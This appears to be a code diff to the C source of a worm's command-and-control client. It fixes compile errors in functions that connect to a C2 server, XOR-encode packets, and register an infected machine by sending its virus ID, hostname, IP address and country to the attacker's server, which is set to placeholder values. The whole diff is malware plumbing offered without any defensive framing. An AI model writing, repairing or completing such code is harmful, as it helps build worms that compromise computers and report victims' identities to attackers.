@@ -9,6 +9,7 @@
 #include <stdio.h>
 #include <cstring>
 #include <string.h>
+#include <stdlib.h>
 #include "networking.h"
 
 #define DEFAULT_BUFLEN 512
@@ -20,7 +21,7 @@
 *  Input: the hostname and port of the C2 server
 *  Output: Handle for connection
 */
-SOCKET connect_to_c2(char *hostname, int port){
+SOCKET connect_to_c2(const char *hostname, const char *port){
 	
 	/* Initialize Winsock */
 	WSADATA wsaData;
@@ -71,7 +72,7 @@ SOCKET connect_to_c2(char *hostname, int port){
 	/* Connection Error Check */
 	freeaddrinfo(result);
 	if(ConnectSocket == INVALID_SOCKET){
-		printf("Unable to connect to server!\n:);
+		printf("Unable to connect to server!\n: ");
 		WSACleanup();
 		return 1;
 	}
@@ -84,13 +85,13 @@ SOCKET connect_to_c2(char *hostname, int port){
 *  Output: Response Packet
 */
 		       
-char *send_to_c2(char *encrypted_data){
+int send_to_c2(char *encrypted_data, SOCKET ConnectSocket){
 	char recvbuf[DEFAULT_BUFLEN];
 	int iResult;
 
-	iResult = send(ConnectSocket, sendbuf, (int) strlen(sendbuf), 0);
+	iResult = send(ConnectSocket, encrypted_data, (int) strlen(encrypted_data), 0);
 	if(iResult == SOCKET_ERROR){
-		printf("send failed: %d\n, WSAGetLastError());
+		printf("send failed: %d\n", WSAGetLastError());
 		closesocket(ConnectSocket);
 		WSACleanup();
 		return 1;
@@ -108,7 +109,7 @@ char *send_to_c2(char *encrypted_data){
 
 	/* Receive Data */
 	do {
-		iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
+		iResult = recv(ConnectSocket, recvbuf, sizeof(recvbuf), 0);
 		if(iResult > 0){
 			printf("Bytes received: %d\n", iResult);
 		}else if(iResult == 0)
@@ -117,7 +118,7 @@ char *send_to_c2(char *encrypted_data){
 			printf("recv failed: %d\n", WSAGetLastError());
 	} while(iResult > 0);
 
-	return recvbuf;
+	return 0;
 }
 
 /* Function: Encrypts a Data packet from plaintext buffer 
@@ -130,7 +131,7 @@ char *encryption(char *decrypted_data){
 	char encrypted_data[DEFAULT_BUFLEN];
 
 	/* Extract XOR key */
-	XOR_key = decrypted_data[0];
+	char XOR_key = decrypted_data[0];
 	
 	/* Apply XOR key to rest of the buffer */
 	for(i=1; i < strlen(decrypted_data); ++i){
@@ -150,7 +151,7 @@ char *decryption(char *encrypted_data){
 	char decrypted_data[DEFAULT_BUFLEN];
 
 	/* Extract XOR key */
-	XOR_key = encrypted_data[0];
+	char XOR_key = encrypted_data[0];
 
 	/* Apply XOR key to rest of the buffer */
 	for(i=1; i < strlen(encrypted_data); ++i){
@@ -188,10 +189,10 @@ char *structure_init_message(char XOR_key, char *virus_id, char *hostname, char 
 
 	/* Create Message Buffer */
 	buffer[0] = XOR_key;
-	buffer = strcat(buffer, virus_id);
-	buffer = strcat(buffer, hostname);
-	buffer = strcat(buffer, ip);
-	buffer = strcat(buffer, country);
+	strcat(buffer, virus_id);
+	strcat(buffer, hostname);
+	strcat(buffer, ip);
+	strcat(buffer, country);
 
 	return buffer;
 }
@@ -202,8 +203,11 @@ char *structure_init_message(char XOR_key, char *virus_id, char *hostname, char 
 */
 
 int register_worm(char XOR_key, char *virus_id, char *hostname, char *ip, char *country){
+	const char* server_hostname = "idk";
+	const char* client_hostname = "1111";
+	SOCKET sock = connect_to_c2(server_hostname, client_hostname);
 	char *message = structure_init_message(XOR_key, virus_id, hostname, ip, country);
 	char *encrypted_message = encryption(message);
-	int result = send_to_c2(encrypted_message);
+	int result = send_to_c2(encrypted_message, sock);
 	return result;
 }
